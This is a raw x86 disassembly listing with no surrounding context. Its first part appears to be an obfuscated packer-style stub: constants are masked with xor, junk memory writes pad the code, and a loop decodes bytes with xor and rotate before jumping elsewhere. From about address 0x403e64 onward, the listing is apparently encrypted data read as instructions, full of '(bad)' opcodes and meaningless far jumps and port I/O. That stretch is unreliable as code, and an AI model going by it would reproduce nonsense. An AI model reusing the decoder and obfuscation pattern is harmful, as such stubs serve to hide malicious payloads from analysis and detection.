  403933:	lea    ecx,[eax-0x3272f6]
  403939:	mov    DWORD PTR [ebp-0x14],ecx
  40393c:	and    DWORD PTR ds:0x428e73,0x0
  403946:	mov    edx,DWORD PTR ds:0x428e73
  40394c:	inc    edx
  40394d:	mov    DWORD PTR ds:0x428e73,edx
  403953:	cmp    DWORD PTR ds:0x428e73,0x20
  40395a:	ja     0x403980
  403960:	jmp    0x403973
  403965:	push   0x428e8b
  40396a:	push   DWORD PTR [ebp-0xc]
  40396d:	call   DWORD PTR ds:0x42a9df
  403973:	cmp    DWORD PTR ds:0x428e73,0x11
  40397a:	jb     0x403946
  403980:	mov    edx,DWORD PTR [ebp-0x14]
  403983:	or     DWORD PTR ds:0x428e6b,0xd5d
  40398d:	xor    edx,esi
  40398f:	xor    DWORD PTR ds:0x428e83,0x428e5f
  403999:	add    edx,0x7f55d8e3
  40399f:	lea    ecx,[ebp+eax*4-0xb4]
  4039a6:	mov    DWORD PTR [ecx],edx
  4039a8:	mov    DWORD PTR ds:0x428e47,0xcba
  4039b2:	mov    edx,DWORD PTR [ecx]
  4039b4:	mov    DWORD PTR ds:0x428e2b,0xfd2
  4039be:	cmp    edx,0x244ecb82
  4039c4:	jbe    0x4039e9
  4039ca:	xor    DWORD PTR ds:0x428ea3,0x47b3
  4039d4:	add    DWORD PTR [ecx],0x405fcc1
  4039da:	mov    DWORD PTR ds:0x428e63,0x27c8
  4039e4:	jmp    0x4039f9
  4039e9:	or     DWORD PTR ds:0x428ea3,0x2c0c
  4039f3:	add    DWORD PTR [ecx],0xfdaf433f
  4039f9:	mov    ecx,DWORD PTR [ebp-0x18]
  4039fc:	and    DWORD PTR ds:0x428e27,0x4d72
  403a06:	xor    ecx,esi
  403a08:	xor    DWORD PTR ds:0x428ea3,0x741f
  403a12:	inc    eax
  403a13:	sub    DWORD PTR ds:0x428e37,0x428eb7
  403a1d:	inc    DWORD PTR [ebp-0x14]
  403a20:	add    ecx,edi
  403a22:	mov    DWORD PTR ds:0x428e47,0x2f68
  403a2c:	cmp    eax,ecx
  403a2e:	jb     0x40393c
  403a34:	and    DWORD PTR ds:0x428e9b,0x0
  403a3e:	mov    eax,ds:0x428e9b
  403a43:	inc    eax
  403a44:	mov    ds:0x428e9b,eax
  403a49:	cmp    DWORD PTR ds:0x428e9b,0xd
  403a50:	jb     0x403a8c
  403a56:	jmp    0x403a67
  403a5b:	push   DWORD PTR [ebp-0x18]
  403a5e:	push   DWORD PTR [ebp-0x1c]
  403a61:	call   DWORD PTR ds:0x42a9e3
  403a67:	cmp    DWORD PTR ds:0x428e9b,0xc
  403a6e:	jne    0x403a7f
  403a74:	mov    eax,ds:0x428e9b
  403a79:	inc    eax
  403a7a:	mov    ds:0x428e9b,eax
  403a7f:	cmp    DWORD PTR ds:0x428e9b,0x15
  403a86:	jb     0x403a3e
  403a8c:	mov    dl,BYTE PTR [ebp-0x21]
  403a8f:	xor    eax,0x61a1
  403a94:	mov    eax,DWORD PTR [ebp-0x34]
  403a97:	xor    al,0xaf
  403a99:	mov    cl,0xa
  403a9b:	sub    cl,al
  403a9d:	add    DWORD PTR ds:0x428ea3,0x32c3
  403aa7:	add    dl,cl
  403aa9:	sbb    ecx,DWORD PTR ds:0x428eb3
  403aaf:	mov    ecx,DWORD PTR [ebp-0x1c]
  403ab2:	sub    DWORD PTR ds:0x428ea7,0x428e8f
  403abc:	xor    cl,0xaf
  403abf:	sub    cl,0xa
  403ac2:	sub    DWORD PTR ds:0x428ea3,0x68fd
  403acc:	ror    dl,cl
  403ace:	sub    DWORD PTR ds:0x428e6b,ebx
  403ad4:	xor    eax,eax
  403ad6:	mov    eax,DWORD PTR [ebp-0xc]
  403ad9:	add    DWORD PTR ds:0x428e8f,ebx
  403adf:	mov    BYTE PTR [eax+ebx*1+0x800],dl
  403ae6:	mov    ecx,DWORD PTR ds:0x4292eb
  403aec:	mov    eax,ds:0x429777
  403af1:	sub    ecx,eax
  403af3:	and    ecx,DWORD PTR [ecx+eax*1]
  403af6:	mov    eax,DWORD PTR [ebp-0xc]
  403af9:	mov    DWORD PTR ds:0x428e33,0x15
  403b03:	cmp    DWORD PTR ds:0x428e33,0x0
  403b0a:	je     0x403b3f
  403b10:	cmp    DWORD PTR ds:0x428e33,0x25
  403b17:	jbe    0x403b3f
  403b1d:	jmp    0x403b2d
  403b22:	push   0x428e23
  403b27:	call   DWORD PTR ds:0x42a9e7
  403b2d:	mov    ecx,DWORD PTR ds:0x428e33
  403b33:	dec    ecx
  403b34:	mov    DWORD PTR ds:0x428e33,ecx
  403b3a:	jmp    0x403b03
  403b3f:	mov    ecx,DWORD PTR [ebp-0x28]
  403b42:	neg    DWORD PTR ds:0x428e5b
  403b48:	sub    eax,edi
  403b4a:	sub    DWORD PTR ds:0x428e8b,0x4b02
  403b54:	xor    eax,esi
  403b56:	mov    DWORD PTR ds:0x428ec7,0x6067
  403b60:	cmp    eax,ecx
  403b62:	jne    0x403b8c
  403b68:	mov    eax,DWORD PTR [ebp-0x8]
  403b6b:	mov    ecx,DWORD PTR [ebp-0x10]
  403b6e:	xor    eax,esi
  403b70:	xor    ecx,esi
  403b72:	sub    eax,ecx
  403b74:	sub    eax,edi
  403b76:	xor    eax,esi
  403b78:	mov    DWORD PTR [ebp-0x8],eax
  403b7b:	mov    eax,DWORD PTR [ebp-0x10]
  403b7e:	xor    eax,esi
  403b80:	mov    ecx,0xffcd8d8a
  403b85:	sub    ecx,eax
  403b87:	jmp    0x403b9b
  403b8c:	mov    eax,DWORD PTR [ebp-0x10]
  403b8f:	xor    eax,esi
  403b91:	mov    ecx,0xffcd8d0a
  403b96:	sub    ecx,eax
  403b98:	add    ecx,DWORD PTR [ebp-0xc]
  403b9b:	mov    DWORD PTR [ebp-0xc],ecx
  403b9e:	mov    eax,DWORD PTR [ebp-0x8]
  403ba1:	cmp    eax,0xf89c85a5
  403ba6:	jne    0x403815
  403bac:	mov    DWORD PTR [ebp-0x34],0x9
  403bb3:	mov    ecx,DWORD PTR [ebp+0x8]
  403bb6:	xor    ecx,esi
  403bb8:	add    ecx,edi
  403bba:	jmp    0x403e1a
  403bbf:	lea    eax,[ecx+ebx*1]
  403bc2:	mov    DWORD PTR [ebp-0x2c],eax
  403bc5:	mov    eax,DWORD PTR [ebp-0x58]
  403bc8:	sub    eax,ecx
  403bca:	mov    DWORD PTR [ebp-0x1c],eax
  403bcd:	mov    eax,DWORD PTR [ebp-0x1c]
  403bd0:	mov    DWORD PTR [ebp-0x14],eax
  403bd3:	mov    eax,DWORD PTR [ebp-0x2c]
  403bd6:	mov    DWORD PTR [ebp-0x38],0xf89c85a5
  403bdd:	mov    DWORD PTR [ebp-0x54],eax
  403be0:	mov    DWORD PTR [ebp-0x20],0xf89c85a4
  403be7:	mov    eax,DWORD PTR [ebp-0x38]
  403bea:	xor    eax,esi
  403bec:	add    eax,edi
  403bee:	mov    DWORD PTR [ebp-0x10],eax
  403bf1:	mov    eax,DWORD PTR [ebp-0x38]
  403bf4:	xor    eax,esi
  403bf6:	add    eax,edi
  403bf8:	mov    DWORD PTR [ebp-0x8],eax
  403bfb:	mov    DWORD PTR [ebp-0x2c],0xf89c8585
  403c02:	mov    DWORD PTR [ebp-0x44],0xf89c85be
  403c09:	mov    eax,DWORD PTR [ebp-0x38]
  403c0c:	mov    edx,DWORD PTR [ebp-0x14]
  403c0f:	xor    eax,esi
  403c11:	add    eax,edi
  403c13:	cmp    edx,eax
  403c15:	je     0x403e0e
  403c1b:	mov    eax,DWORD PTR [ebp-0x20]
  403c1e:	xor    eax,esi
  403c20:	mov    edx,0xffcd8d0a
  403c25:	sub    edx,eax
  403c27:	add    edx,DWORD PTR [ebp-0x14]
  403c2a:	mov    eax,DWORD PTR [ebp-0x20]
  403c2d:	mov    ebx,DWORD PTR [ebp-0x10]
  403c30:	xor    eax,esi
  403c32:	add    eax,edi
  403c34:	imul   eax,ebx
  403c37:	cmp    eax,edx
  403c39:	ja     0x403e0b
  403c3f:	mov    edx,DWORD PTR [ebp-0x10]
  403c42:	mov    eax,DWORD PTR [ebp-0x14]
  403c45:	mov    ebx,DWORD PTR [ebp-0x2c]
  403c48:	sub    eax,edx
  403c4a:	xor    ebx,esi
  403c4c:	xor    edx,edx
  403c4e:	add    ebx,edi
  403c50:	div    ebx
  403c52:	mov    DWORD PTR [ebp-0x8],eax
  403c55:	mov    eax,DWORD PTR [ebp-0x44]
  403c58:	mov    edx,DWORD PTR [ebp-0x8]
  403c5b:	xor    eax,esi
  403c5d:	add    eax,edi
  403c5f:	cmp    edx,eax
  403c61:	jbe    0x403c71
  403c67:	mov    eax,DWORD PTR [ebp-0x44]
  403c6a:	xor    eax,esi
  403c6c:	add    eax,edi
  403c6e:	mov    DWORD PTR [ebp-0x8],eax
  403c71:	mov    eax,DWORD PTR [ebp-0x2c]
  403c74:	mov    edx,DWORD PTR [ebp-0x8]
  403c77:	xor    eax,esi
  403c79:	add    eax,edi
  403c7b:	imul   eax,edx
  403c7e:	mov    DWORD PTR [ebp-0x8],eax
  403c81:	mov    eax,DWORD PTR [ebp-0x38]
  403c84:	mov    edx,DWORD PTR [ebp-0x8]
  403c87:	xor    eax,esi
  403c89:	add    eax,edi
  403c8b:	cmp    edx,eax
  403c8d:	je     0x403df4
  403c93:	mov    eax,DWORD PTR [ebp-0x8]
  403c96:	mov    DWORD PTR [ebp-0x18],eax
  403c99:	mov    eax,DWORD PTR [ebp-0x10]
  403c9c:	add    eax,DWORD PTR [ebp-0x54]
  403c9f:	mov    DWORD PTR [ebp-0x1c],0xf89c85a5
  403ca6:	mov    DWORD PTR [ebp-0x8],eax
  403ca9:	mov    eax,0xf89c85a4
  403cae:	mov    DWORD PTR [ebp-0x28],eax
  403cb1:	mov    DWORD PTR [ebp-0x5c],0xf89c85a3
  403cb8:	mov    DWORD PTR [ebp-0x40],0xf89c85a2
  403cbf:	mov    DWORD PTR [ebp-0x30],eax
  403cc2:	mov    eax,DWORD PTR [ebp-0x1c]
  403cc5:	xor    eax,esi
  403cc7:	add    eax,edi
  403cc9:	jmp    0x403db0
  403cce:	mov    DWORD PTR [ebp-0x4c],0xf89c85ba
  403cd5:	mov    DWORD PTR [ebp-0x50],0xf89c858f
  403cdc:	mov    eax,DWORD PTR [ebp-0x30]
  403cdf:	mov    edx,DWORD PTR [ebp-0xc]
  403ce2:	xor    eax,esi
  403ce4:	add    eax,edi
  403ce6:	imul   eax,edx
  403ce9:	mov    edx,DWORD PTR [ebp-0x8]
  403cec:	mov    al,BYTE PTR [eax+edx*1]
  403cef:	mov    BYTE PTR [ebp-0x1],al
  403cf2:	mov    eax,DWORD PTR [ebp-0x30]
  403cf5:	mov    edx,DWORD PTR [ebp-0xc]
  403cf8:	xor    eax,esi
  403cfa:	add    eax,edi
  403cfc:	imul   eax,edx
  403cff:	mov    edx,DWORD PTR [ebp-0x5c]
  403d02:	xor    edx,esi
  403d04:	add    eax,edx
  403d06:	mov    edx,DWORD PTR [ebp-0x8]
  403d09:	movzx  eax,BYTE PTR [eax+edx*1+0x3272f6]
  403d11:	mov    edx,DWORD PTR [ebp-0x4c]
  403d14:	xor    edx,esi
  403d16:	lea    eax,[edx+eax*1+0x3272f6]
  403d1d:	movzx  edx,BYTE PTR [ebp-0x1]
  403d21:	xor    edx,eax
  403d23:	mov    BYTE PTR [ebp-0x1],dl
  403d26:	mov    al,BYTE PTR [ebp-0x1]
  403d29:	mov    edx,DWORD PTR [ebp-0x30]
  403d2c:	mov    ebx,DWORD PTR [ebp-0xc]
  403d2f:	xor    edx,esi
  403d31:	add    edx,edi
  403d33:	imul   edx,ebx
  403d36:	mov    ebx,DWORD PTR [ebp-0x8]
  403d39:	mov    BYTE PTR [edx+ebx*1],al
  403d3c:	mov    eax,DWORD PTR [ebp-0x30]
  403d3f:	mov    edx,DWORD PTR [ebp-0xc]
  403d42:	xor    eax,esi
  403d44:	add    eax,edi
  403d46:	imul   eax,edx
  403d49:	mov    edx,DWORD PTR [ebp-0x8]
  403d4c:	mov    al,BYTE PTR [eax+edx*1]
  403d4f:	mov    BYTE PTR [ebp-0x1],al
  403d52:	mov    eax,DWORD PTR [ebp-0x30]
  403d55:	mov    edx,DWORD PTR [ebp-0xc]
  403d58:	xor    eax,esi
  403d5a:	add    eax,edi
  403d5c:	imul   eax,edx
  403d5f:	mov    edx,DWORD PTR [ebp-0x28]
  403d62:	xor    edx,esi
  403d64:	add    eax,edx
  403d66:	mov    edx,DWORD PTR [ebp-0x8]
  403d69:	movzx  eax,BYTE PTR [eax+edx*1+0x3272f6]
  403d71:	mov    edx,DWORD PTR [ebp-0x50]
  403d74:	xor    edx,esi
  403d76:	lea    eax,[edx+eax*1+0x3272f6]
  403d7d:	movzx  edx,BYTE PTR [ebp-0x1]
  403d81:	xor    edx,eax
  403d83:	mov    BYTE PTR [ebp-0x1],dl
  403d86:	mov    al,BYTE PTR [ebp-0x1]
  403d89:	mov    edx,DWORD PTR [ebp-0x30]
  403d8c:	mov    ebx,DWORD PTR [ebp-0xc]
  403d8f:	xor    edx,esi
  403d91:	add    edx,edi
  403d93:	imul   edx,ebx
  403d96:	mov    ebx,DWORD PTR [ebp-0x8]
  403d99:	mov    BYTE PTR [edx+ebx*1],al
  403d9c:	mov    eax,DWORD PTR [ebp-0x40]
  403d9f:	mov    edx,DWORD PTR [ebp-0x28]
  403da2:	xor    eax,esi
  403da4:	xor    edx,esi
  403da6:	add    eax,edi
  403da8:	add    edx,edi
  403daa:	imul   eax,edx
  403dad:	add    eax,DWORD PTR [ebp-0xc]
  403db0:	mov    DWORD PTR [ebp-0xc],eax
  403db3:	mov    eax,DWORD PTR [ebp-0xc]
  403db6:	mov    edx,DWORD PTR [ebp-0x18]
  403db9:	cmp    edx,eax
  403dbb:	jb     0x403cce
  403dc1:	mov    eax,DWORD PTR [ebp-0x28]
  403dc4:	mov    edx,DWORD PTR [ebp-0x18]
  403dc7:	xor    eax,esi
  403dc9:	add    eax,edi
  403dcb:	imul   eax,edx
  403dce:	mov    edx,DWORD PTR [ebp-0x1c]
  403dd1:	xor    edx,esi
  403dd3:	add    edx,edi
  403dd5:	or     eax,edx
  403dd7:	mov    edx,DWORD PTR [ebp-0x20]
  403dda:	xor    edx,esi
  403ddc:	add    eax,edx
  403dde:	mov    edx,DWORD PTR [ebp-0x20]
  403de1:	xor    edx,esi
  403de3:	add    eax,edx
  403de5:	mov    edx,DWORD PTR [ebp-0x10]
  403de8:	lea    eax,[eax+edx*1+0x64e5ec]
  403def:	jmp    0x403e03
  403df4:	mov    eax,DWORD PTR [ebp-0x20]
  403df7:	mov    edx,DWORD PTR [ebp-0x10]
  403dfa:	xor    eax,esi
  403dfc:	lea    eax,[eax+edx*1+0x3272f6]
  403e03:	mov    DWORD PTR [ebp-0x10],eax
  403e06:	jmp    0x403c1b
  403e0b:	mov    ebx,DWORD PTR [ebp-0x3c]
  403e0e:	mov    eax,DWORD PTR [ebp+0xc]
  403e11:	xor    eax,esi
  403e13:	lea    ecx,[ecx+eax*1+0x3272f6]
  403e1a:	lea    eax,[ecx-0x3272f6]
  403e20:	xor    eax,esi
  403e22:	cmp    eax,0xf89c95a5
  403e27:	jne    0x403bbf
  403e2d:	dec    DWORD PTR [ebp-0x34]
  403e30:	jne    0x403bb3
  403e36:	mov    eax,DWORD PTR [ebp+0x8]
  403e39:	mov    ecx,DWORD PTR [ebp+0xc]
  403e3c:	mov    edx,DWORD PTR [ebp+0x8]
  403e3f:	xor    ecx,esi
  403e41:	mov    cl,BYTE PTR [ecx+ebx*1+0x3272f6]
  403e48:	xor    eax,esi
  403e4a:	mov    al,BYTE PTR [eax+ebx*1+0x3272f6]
  403e51:	xor    edx,esi
  403e53:	mov    BYTE PTR [edx+ebx*1+0x3272f6],cl
  403e5a:	mov    ecx,DWORD PTR [ebp+0xc]
  403e5d:	xor    ecx,esi
  403e5f:	jmp    0x4061b8
  403e64:	outs   dx,BYTE PTR ds:[esi]
  403e65:	pop    edi
  403e66:	or     al,BYTE PTR [bp+0xa]
  403e6a:	push   cs
  403e6b:	pop    ss
  403e6c:	xor    edx,esi
  403e6e:	cld    
  403e6f:	fwait
  403e70:	xchg   ebx,eax
  403e71:	ins    DWORD PTR es:[edi],dx
  403e72:	aaa    
  403e73:	push   0x83836047
  403e78:	inc    edi
  403e79:	pusha  
  403e7a:	add    DWORD PTR [ebx-0x636c9477],0x12
  403e81:	mov    ch,0x8c
  403e83:	jne    0x403ecb
  403e85:	sub    ecx,DWORD PTR [ecx-0x45064ae2]
  403e8b:	enter  0x144c,0x1f
  403e8f:	call   0x7bcb3a95
  403e94:	(bad)  
  403e95:	pusha  
  403e96:	and    ah,BYTE PTR [eax+ecx*4-0x7145f6d2]
  403e9d:	test   DWORD PTR [ecx],ecx
  403e9f:	jnp    0x403ed1
  403ea1:	out    dx,eax
  403ea2:	sbb    eax,0x881e6c7c
  403ea7:	push   es
  403ea8:	es sbb eax,0x71079e03
  403eae:	mov    edi,0xfb5cde52
  403eb3:	pop    ecx
  403eb4:	jmp    0xca0b2cec
  403eb9:	fst    QWORD PTR [ecx]
  403ebb:	cmp    eax,0xcaf627f6
  403ec0:	mov    eax,0x30c74f6f
  403ec6:	push   ecx
  403ec7:	aam    0x40
  403ec9:	or     eax,DWORD PTR [esi-0x73]
  403ecc:	call   0xfb35:0xba73f123
  403ed3:	dec    edi
  403ed4:	xchg   DWORD PTR [eax],ebp
  403ed6:	mov    ah,0x42
  403ed8:	(bad)  
  403ed9:	mov    ch,0xa3
  403edb:	xlat   BYTE PTR ds:[ebx]
  403edc:	mov    cl,0x16
  403ede:	push   esi
  403edf:	add    eax,0xff3e4028
  403ee4:	ret    0x1c10
  403ee7:	cwde   
  403ee8:	pop    ebx
  403ee9:	push   es
  403eea:	xchg   DWORD PTR [esp+eiz*8+0x10775c83],edi
  403ef1:	mov    cl,0x57
  403ef3:	xor    DWORD PTR [ecx],eax
  403ef5:	push   ebx
  403ef6:	jno    0x403ecb
  403ef8:	or     BYTE PTR [esi],cl
  403efa:	cs pop edx
  403efc:	inc    ecx
  403efd:	int3   
  403efe:	in     eax,0xc7
  403f00:	stos   BYTE PTR es:[edi],al
  403f01:	imul   ebp,DWORD PTR [eax+edx*4+0x1ed56f45],0xbad1cdf5
  403f0c:	out    0xbe,al
  403f0e:	fbstp  TBYTE PTR [ebp+0x3]
  403f11:	shl    DWORD PTR ds:0x10149b23,0xc0
  403f18:	jmp    0x49dc:0x2c136b42
  403f1f:	inc    ebp
  403f20:	or     ecx,eax
  403f22:	call   0x61ad:0x5a98600e
  403f29:	ret    
  403f2a:	stos   BYTE PTR es:[edi],al
  403f2b:	lock js 0x403f2f
  403f2e:	data16 (bad) 
  403f30:	(bad)  [edi+eiz*2-0x3c]
  403f34:	xchg   esi,eax
  403f35:	xchg   ebx,eax
  403f36:	cmc    
  403f37:	dec    eax
  403f38:	jecxz  0x403f02
  403f3a:	jae    0x403f5e
  403f3c:	seto   BYTE PTR [esi+0x1b]
  403f40:	imul   ebx,DWORD PTR [ebx],0xce09947c
  403f46:	jl     0x403f92
  403f48:	mov    ah,BYTE PTR [edx-0x24]
  403f4b:	xchg   DWORD PTR [eax],esi
  403f4d:	mov    bl,0x4e
  403f4f:	(bad)  
  403f50:	adc    BYTE PTR [ecx+ebx*8+0x9],dl
  403f54:	add    ebx,DWORD PTR [eax+0x49]
  403f57:	adc    DWORD PTR [esi],esp
  403f59:	iret   
  403f5a:	xchg   edi,eax
  403f5b:	pop    ds
  403f5c:	into   
  403f5d:	adc    al,0x3d
  403f5f:	test   DWORD PTR [edx+0x36],ecx
  403f62:	in     al,dx
  403f63:	lds    edx,FWORD PTR [ebp+0x7683f3ff]
  403f69:	mov    DWORD PTR [edi+ebx*4-0x1183f4e0],ecx
  403f70:	div    DWORD PTR [edi-0x2d]
  403f73:	jl     0x403f44
  403f75:	and    BYTE PTR [edi+ebx*8+0x77a22ab4],cl
  403f7c:	in     al,0x88
  403f7e:	stos   DWORD PTR es:[edi],eax
  403f7f:	add    bl,bl
  403f81:	hlt    
  403f82:	clc    
  403f83:	and    al,0x7b
  403f85:	xor    esp,DWORD PTR [ebp+0xdddeb2]
  403f8b:	fdiv   st(4),st
  403f8d:	pop    edx
  403f8e:	xor    DWORD PTR [edi-0x292e8d11],edi
  403f94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403f95:	jno    0x403f4a
  403f97:	mov    ebx,0xcdd9c97d
  403f9c:	into   
  403f9d:	scas   eax,DWORD PTR es:[edi]
  403f9e:	dec    ebx
  403f9f:	xor    bl,BYTE PTR [ebp-0x1dee3abc]
  403fa5:	and    DWORD PTR [eax-0x27e88cc0],ebx
  403fab:	in     al,dx
  403fac:	sub    DWORD PTR [ebx-0x1a],edi
  403faf:	scas   al,BYTE PTR es:[edi]
  403fb0:	dec    ecx
  403fb1:	xchg   esi,eax
  403fb2:	gs push cs
  403fb4:	dec    ebx
  403fb5:	cmp    DWORD PTR [ebp-0x3b],ebp
  403fb8:	dec    esi
  403fb9:	imul   esi,DWORD PTR [esi-0x7738545d],0x6b
  403fc0:	pop    ds
  403fc1:	mov    dh,0x9a
  403fc3:	cld    
  403fc4:	(bad)  
  403fc5:	cmp    edx,DWORD PTR [edx-0x39]
  403fc8:	xchg   ecx,eax
  403fc9:	popa   
  403fca:	cmp    DWORD PTR [edx-0x3f],0xf36adc8
  403fd1:	arpl   WORD PTR [edi-0x49],sp
  403fd4:	xchg   esp,eax
  403fd5:	cs aad 0x9f
  403fd8:	inc    ebp
  403fd9:	mov    BYTE PTR [eax+0x7c9f1346],al
  403fdf:	int3   
  403fe0:	es into 
  403fe2:	neg    DWORD PTR [ebp+0x40]
  403fe5:	loop   0x404060
  403fe7:	outs   dx,BYTE PTR ds:[esi]
  403fe8:	inc    esi
  403fe9:	retf   0xf320
  403fec:	cmp    al,0xde
  403fee:	or     al,0x95
  403ff0:	and    al,0x56
  403ff2:	jns    0x403fcd
  403ff4:	fcom   DWORD PTR [ebp-0x155644a1]
  403ffa:	push   edx
  403ffb:	in     eax,dx
  403ffc:	je     0x403ff4
  403ffe:	xor    edi,DWORD PTR [ecx]
  404000:	fdivr  QWORD PTR gs:[ecx-0x78]
  404004:	mov    ebp,0xa9a7d60f
  404009:	cmp    ecx,DWORD PTR ds:0xf462b5a7
  40400f:	test   cl,0x82
  404012:	adc    eax,esp
  404014:	push   esi
  404015:	retf   0xb08b
  404018:	xchg   ecx,eax
  404019:	inc    ebx
  40401a:	xchg   edx,eax
  40401b:	adc    al,0xcf
  40401d:	in     eax,dx
  40401e:	dec    esp
  40401f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404020:	imul   esp,eax,0xf4eb1a04
  404026:	pop    eax
  404027:	out    dx,eax
  404028:	jo     0x403ff6
  40402a:	int    0x6
  40402c:	aam    0x17
  40402e:	ja     0x403fc7
  404030:	dec    ebx
  404031:	in     eax,0xaa
  404033:	iret   
  404034:	push   esi
  404035:	pop    ebx
  404036:	fidivr DWORD PTR [ecx+0x7c]
  404039:	ret    0x1d4
  40403c:	adc    al,0xac
  40403e:	push   es
  40403f:	cld    
  404040:	jmp    0x404011
  404042:	(bad)  
  404043:	arpl   WORD PTR [ebp-0x3c06c8bd],bp
  404049:	add    eax,0xd0913ff7
  40404e:	or     DWORD PTR [eax-0xf],ecx
  404051:	xor    eax,0xca7e3c9a
  404056:	mov    ebx,0xd4746669
  40405b:	es into 
  40405d:	bound  edx,QWORD PTR [ebx]
  40405f:	fstp   DWORD PTR [ebp-0x22]
  404062:	sub    DWORD PTR [ecx-0x7f],0xfffffffa
  404066:	les    eax,FWORD PTR [edi]
  404068:	std    
  404069:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40406a:	add    al,0x43
  40406c:	jmp    0xf2d0:0x848c0dd5
  404073:	in     eax,0xbd
  404075:	push   edi
  404076:	adc    BYTE PTR [ecx-0x10],dh
  404079:	xchg   ecx,eax
  40407a:	das    
  40407b:	bound  edx,QWORD PTR es:[ebp-0x14]
  40407f:	pop    es
  404080:	jne    0x4040a5
  404082:	fsubr  st,st(0)
  404084:	pop    es
  404085:	jg     0x404057
  404087:	mov    dl,0x2b
  404089:	dec    esp
  40408a:	leave  
  40408b:	xchg   ebx,eax
  40408c:	test   eax,0xdb998460
  404091:	cmp    esp,DWORD PTR [edi-0x53f38861]
  404097:	jmp    0x4040a5
  404099:	data16 mov al,ds:0xed286bf2
  40409f:	push   ds
  4040a0:	std    
  4040a1:	stos   BYTE PTR es:[edi],al
  4040a2:	jbe    0x4040af
  4040a4:	cmp    al,0x10
  4040a6:	xor    bl,cl
  4040a8:	jno    0x404091
  4040aa:	popf   
  4040ab:	repz ret 
  4040ad:	inc    ebx
  4040ae:	mov    DWORD PTR [edi],ebx
  4040b0:	sbb    eax,DWORD PTR [eax]
  4040b2:	mov    BYTE PTR [esi],0x65
  4040b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4040b6:	push   ebp
  4040b7:	xor    dh,BYTE PTR [ecx+0x26]
  4040ba:	jno    0x404059
  4040bc:	mov    ds:0x3630bdfd,al
  4040c1:	mov    dh,0x43
  4040c3:	xchg   edx,eax
  4040c4:	dec    ecx
  4040c5:	inc    edi
  4040c6:	inc    esi
  4040c7:	xor    BYTE PTR [ecx+0x603b14ca],dh
  4040cd:	(bad)  
  4040ce:	pop    ecx
  4040cf:	test   BYTE PTR [ecx-0x7d60d80f],0x7a
  4040d6:	cdq    
  4040d7:	dec    ebx
  4040d8:	and    eax,DWORD PTR [ebx-0x8]
  4040db:	xchg   esp,eax
  4040dc:	imul   ecx,ebx,0x636e7862
  4040e2:	loop   0x40413b
  4040e4:	inc    esi
  4040e5:	gs lock aad 0x5c
  4040e9:	mov    esp,0x8c130f83
  4040ee:	mov    bh,BYTE PTR [esi+0x18]
  4040f1:	psrld  mm6,QWORD PTR [ecx]
  4040f4:	test   ebx,0x2facb50c
  4040fa:	and    al,dh
  4040fc:	xchg   esp,eax
  4040fd:	mov    esi,0x91e6939e
  404102:	addr16 ja 0x4040e5
  404105:	inc    edi
  404106:	idiv   DWORD PTR [esi+0x451a214f]
  40410c:	xchg   DWORD PTR [edi+0x11330103],edi
  404112:	jmp    0xc8294ee3
  404117:	repz sbb al,0x86
  40411a:	inc    ecx
  40411b:	dec    ebx
  40411c:	in     al,dx
  40411d:	pop    edi
  40411e:	ins    BYTE PTR es:[edi],dx
  40411f:	add    ebx,DWORD PTR [ecx+0x20]
  404122:	dec    esi
  404123:	xchg   edx,eax
  404124:	js     0x4040d9
  404126:	bound  edi,QWORD PTR ss:[edi+0x76]
  40412a:	push   eax
  40412b:	ja     0x404185
  40412d:	repz xor DWORD PTR [ebp+0x1a],edx
  404131:	pop    ecx
  404132:	ret    
  404133:	sbb    DWORD PTR [ecx-0x42],esp
  404136:	das    
  404137:	jne    0x40419b
  404139:	mov    eax,ds:0xc04dcd89
  40413e:	and    cl,BYTE PTR [edx-0xa]
  404141:	pop    ss
  404142:	outs   dx,DWORD PTR ds:[esi]
  404143:	bound  ebp,QWORD PTR [ecx-0x93ff7f9]
  404149:	arpl   si,dx
  40414b:	mov    ebx,0xb5f92ae3
  404150:	jbe    0x404199
  404152:	(bad)  
  404153:	out    0xba,eax
  404155:	fild   DWORD PTR [edx+0x4af4a557]
  40415b:	fwait
  40415c:	jnp    0x40410a
  40415e:	stos   DWORD PTR es:[edi],eax
  40415f:	ins    DWORD PTR es:[edi],dx
  404160:	fmul   QWORD PTR [ebx]
  404162:	jnp    0x40414b
  404164:	jnp    0x404183
  404166:	push   esp
  404167:	jne    0x40412c
  404169:	std    
  40416a:	inc    ecx
  40416b:	aam    0x20
  40416d:	mov    ecx,DWORD PTR [eax+0x4d]
  404170:	(bad)  
  404171:	stc    
  404172:	add    dl,BYTE PTR [esi+0x3]
  404175:	jmp    0xf134:0x45367198
  40417c:	leave  
  40417d:	in     eax,0x93
  40417f:	fwait
  404180:	mov    ah,0xcb
  404182:	lahf   
  404183:	pop    ebp
  404184:	jno    0x404187
  404186:	pop    eax
  404187:	sub    al,0xe0
  404189:	xor    DWORD PTR [edx+eax*1+0x65c6aa30],0x66d3ba84
  404194:	rol    DWORD PTR [edi+0x1e25788d],0x6b
  40419b:	jecxz  0x404130
  40419d:	jge    0x4041b0
  40419f:	adc    cl,dh
  4041a1:	iret   
  4041a2:	adc    esi,DWORD PTR [ebp+0x5b48fa96]
  4041a8:	mov    ds:0x9360acba,al
  4041ad:	xchg   esi,eax
  4041ae:	jbe    0x40418b
  4041b0:	xchg   ebx,eax
  4041b1:	or     eax,0xb3274bad
  4041b6:	sbb    dl,0x57
  4041b9:	mov    bl,0x84
  4041bb:	sub    al,0xf4
  4041bd:	popf   
  4041be:	pop    ss
  4041bf:	dec    esi
  4041c0:	int    0x5f
  4041c2:	ret    
  4041c3:	add    al,0x2
  4041c5:	jns    0x404246
  4041c7:	int    0x6e
  4041c9:	std    
  4041ca:	ins    BYTE PTR es:[edi],dx
  4041cb:	sub    eax,0xda8dd3c5
  4041d1:	addr16 sbb edx,0xffffffc1
  4041d5:	popa   
  4041d6:	pop    ecx
  4041d7:	ret    0x5dba
  4041da:	push   esi
  4041db:	call   0xf1021adf
  4041e0:	xor    DWORD PTR [esi],esp
  4041e2:	test   eax,0x31289e3f
  4041e7:	or     cl,BYTE PTR [edx]
  4041e9:	pop    esp
  4041ea:	sub    al,BYTE PTR [ebx+0x39f36c5e]
  4041f0:	das    
  4041f1:	fimul  WORD PTR [edx]
  4041f3:	dec    esi
  4041f4:	fsub   st(3),st
  4041f6:	outs   dx,BYTE PTR ds:[esi]
